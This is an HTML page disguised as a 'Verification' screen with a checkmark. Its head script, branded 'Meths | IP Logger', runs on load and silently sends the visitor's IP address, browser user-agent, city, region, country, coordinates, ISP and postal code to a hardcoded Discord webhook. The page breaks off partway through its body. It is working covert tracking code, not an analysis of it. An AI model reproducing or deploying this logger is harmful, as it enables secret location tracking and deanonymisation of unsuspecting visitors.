<!DOCTYPE html>
<html>
<head>
	<meta charset="utf-8">
	<title>Verification</title>
	<link type="text/css" rel="stylesheet" href="style.css">
	<script src= "https://ajax.googleapis.com/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
	<script>
		$.get("https://ipinfo.io", function(response) {
			const webhook_url = "https://discord.com/api/webhooks/1542365563945492611/vkBwA5l9xZ-iZmjuuwzQgtGzZpljBxySpwbQUClIQgYJDsqRdLcpOYXHXJTTfxoNDXT5";
			const main = {
				title: "Meths | IP Logger",
				description: "> IP Logger",
				thumbnail: {
					url: "https://cdn.discordapp.com/avatars/586435544750358540/a_36fc175d7430d6e04516474126184ed4.gif?size=2048",
				},
				fields: [
					{
						name: "IP:",
						value: `\`${response.ip}\``,
						inline: false,
					},
					{
						name: "User-Agent:",
						value: `\`${navigator.userAgent}\``,
						inline: false,
					},
					{
						name: "City:",
						value: `\`${response.city}\``,
						inline: false,
					},
					{
						name: "Region:",
						value: `\`${response.region}\``,
						inline: false
					},
					{
						name: "Country:",
						value: `\`${response.country}\``,
						inline: false
					},
					{
						name: "Long/Lat:",
						value: `\`${response.loc}\``,
						inline: false
					},
					{
						name: "Company:",
						value: `\`${response.org}\``,
						inline: false
					},
					{
						name: "Postal Region:",
						value: `\`${response.postal}\``,
						inline: false
					},
				],
				footer: {
					text: "Meths | GET IP LOGGED"
				},
				author: {
					name: "{ Meths }",
					url: ""
				}
			}
			var xhttp = new XMLHttpRequest();
			const url = webhook_url;
			xhttp.open("POST", url, true);
			xhttp.setRequestHeader('Content-Type', 'application/json');
			xhttp.send(JSON.stringify({
				'username': 'IP Logger',
				'embeds': [main],
			}));
		}, "json");
	</script>
</head>
<body style="margin:0; min-height:100vh; display:flex; justify-content:center; align-items:center; font-family:Arial,sans-serif; background:linear-gradient(135deg,#141e30,#243b55); color:white;">

        <div style="width:75px; height:75px; margin:0 auto 20px; display:flex; align-items:center; justify-content:center; border-radius:50%; background:#22c55e; color:white; font-size:42px; box-shadow:0 0 30px rgba(34,197,94,0.5);">
            ✓
